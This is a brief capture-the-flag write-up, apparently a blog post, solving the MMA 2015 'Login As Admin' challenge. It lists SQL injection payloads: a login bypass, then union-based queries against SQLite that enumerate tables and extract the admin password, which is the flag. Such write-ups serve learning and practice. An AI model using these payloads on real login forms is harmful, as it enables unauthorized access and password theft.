---
layout: post
title: "MMA 1st 2015 Login As Admin"
date: 2015-09-06 19:57:01 -0400
author: [superkojiman]
comments: true
categories: [mma]
---

### Solved by superkojiman

The flag is the admin user's real password. 
We can login using sql injection:

```
user: admin
pass: ' or 1=1--
```

This logs us in as admin but we still don't know the password. 

We can use union based injection to solve it. Turns out it's running sqlite: 

Return version:
```
' union select sqlite_version(),1--
```

Get tables. This returns the table "user":
```
' union select name,NULL from sqlite_master--
```

Get password of admin:
```
' union select password,NULL from user where user='admin'--
```

The above returns *You are MMA{cats_alice_band} user*. 
 
